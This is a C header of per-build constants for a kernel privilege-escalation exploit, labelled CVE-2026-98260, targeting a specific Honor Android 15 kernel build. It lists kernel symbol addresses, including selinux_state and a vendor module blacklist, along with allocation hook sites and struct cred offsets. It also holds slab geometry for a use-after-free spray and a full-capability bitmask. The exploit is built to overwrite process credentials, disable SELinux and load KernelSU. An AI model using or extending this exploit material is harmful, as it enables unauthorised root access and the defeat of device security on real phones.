/* pc98260_target_6689.h — CVE-2026-98260 per-build constants.
 *
 * Target: Honor 6.6.89 build g082e5a98dac1 (Android 15 base)
 *   kernel_release = 6.6.89-android15-8-g082e5a98dac1-abogki463734347-4k
 *   4K pages, VA_BITS=39, KMI android15-8
 *
 * Derived from the supplied boot_ota image:
 *   boot image  sha256
 * 91315bd8bba64ea312c79cfdd736e0846d8116ed5209be8cd7474523ee23b2ff kernel
 * sha256 fc802bb8925a8ce831977d6f2fe042d028c43aafd1171da36e7c172d64384400
 *   kallsyms + embedded BTF (vmlinux-to-elf base 0xffffffc080000000)
 *
 * Status: STATIC DERIVATION ONLY — no matching physical device.
 * GEO_TASK_OBJSIZE is a seed; uaf_plant reads /proc/slabinfo at runtime and
 * overrides it, so the credential layout is the important part.
 */
#ifndef PC98260_TARGET_6689_H
#define PC98260_TARGET_6689_H

#include <stdint.h>

#define TARGET_NAME "honor-6689"
#define TARGET_KERNEL "6.6.89-android15-8-g082e5a98dac1-abogki463734347-4k"
#define TARGET_KERNEL_SHA256                                                   \
  "fc802bb8925a8ce831977d6f2fe042d028c43aafd1171da36e7c172d64384400"

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE UINT64_C(0xffffffc082396fd8) /* selinux_state */
#define LINK_INIT_USER_NS UINT64_C(0xffffffc08216eea0)  /* init_user_ns */
#define LINK_ROOT_USER UINT64_C(0xffffffc08216f130)     /* root_user    */
#define LINK_INIT_GROUPS UINT64_C(0xffffffc082170690)   /* init_groups  */
#define LINK_INIT_UCOUNTS UINT64_C(0xffffffc082170c00)  /* init_ucounts */
/* vendor cmdline module_blacklist (char* in .bss): load_module refuses a
 * listed name with -EPERM, so the KSU module cannot load as kernelsu. */
#define LINK_MODULE_BLACKLIST UINT64_C(0xffffffc082378568)

/* ---- kprobe/tracepoint call sites (function-internal) ---------------- */
#define LINK_ALLOC_TIMER UINT64_C(0xffffffc080398678) /* do_timer_create+0x94  \
                                                       */
#define LINK_ALLOC_CRED UINT64_C(0xffffffc080264f08)  /* prepare_creds+0x20  */
#define LINK_ALLOC_TASK UINT64_C(0xffffffc0802607fc)  /* copy_process+0x13c */

/* ---- struct geometry (6.6.89 .BTF) ---------------------------------- */
#define GEO_TASK_CRED 0x820      /* task_struct.cred          */
#define GEO_TASK_REAL_CRED 0x818 /* task_struct.real_cred     */
#define GEO_TASK_COMM 0x830      /* task_struct.comm          */
#define GEO_KITIMER_IT 0x78      /* k_itimer.it (cpu_timer.node) */
#define GEO_KITIMER_SIZE 0x108   /* sizeof(k_itimer) = 264    */
#define GEO_KITIMER_STRIDE 0x108 /* posix_timers_cache object */
#define GEO_CRED_SIZE 184        /* sizeof(struct cred)       */
#define GEO_CRED_ALLOC_SIZE 192  /* cred_jar cache object size */
#define GEO_CRED_UID 0x8
#define GEO_CRED_GID 0xc
#define GEO_CRED_SUID 0x10
#define GEO_CRED_SGID 0x14
#define GEO_CRED_EUID 0x18
#define GEO_CRED_EGID 0x1c
#define GEO_CRED_FSUID 0x20
#define GEO_CRED_FSGID 0x24
#define GEO_CRED_CAP_INH 0x30
#define GEO_CRED_CAP_PERM 0x38
#define GEO_CRED_CAP_EFF 0x40
#define GEO_CRED_CAP_BSET 0x48
#define GEO_CRED_CAP_AMB 0x50
#define GEO_CRED_SECURITY 0x80
#define GEO_CRED_USER 0x88
#define GEO_CRED_USER_NS 0x90
#define GEO_CRED_UCOUNTS 0x98
#define GEO_CRED_GROUP_INFO 0xa0
#define GEO_SELINUX_ENFORCE 0
#define GEO_SELINUX_INIT 1
#define GEO_SELINUX_WRITE (-7)
#define GEO_SELINUX_SIZE 0x80

/* ---- slab geometry (live /proc/slabinfo will override task size) ----- */
#define GEO_TASK_OBJSIZE 4800 /* sizeof(task_struct)=0x12c0 seed */
#define GEO_TASK_OBJ_PER_SLAB 0
#define GEO_TASK_SLAB_PAGES 0
#define GEO_POSIX_TIMER_OBJSIZE 264
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 31
#define GEO_POSIX_TIMER_SLAB_ORDER 1
#define GEO_PAGE_SIZE 4096
#define GEO_FRAG_PAGE_SIZE 8192

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS 39
#define GEOM_MEMSTART_PFN UINT64_C(0x80000)
#define GEOM_MEMSTART_ADDR UINT64_C(0xffffffc0816867a8) /* memstart_addr */

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL UINT64_C(0x1ffffffffff)

/* ---- begin_new_exec cleanup offsets --------------------------------- */
#define BNE_LINK UINT64_C(0xffffffc080284ea4) /* begin_new_exec */
#define BNE_RELEASE_TASK_OFF 0
#define BNE_DOWN_READ_OFF 0x15c
#define BNE_TIMERS_EXIT_OFF 0x2a0
#define BNE_EXIT_ITIMERS_OFF 0x2b0

#endif /* PC98260_TARGET_6689_H */
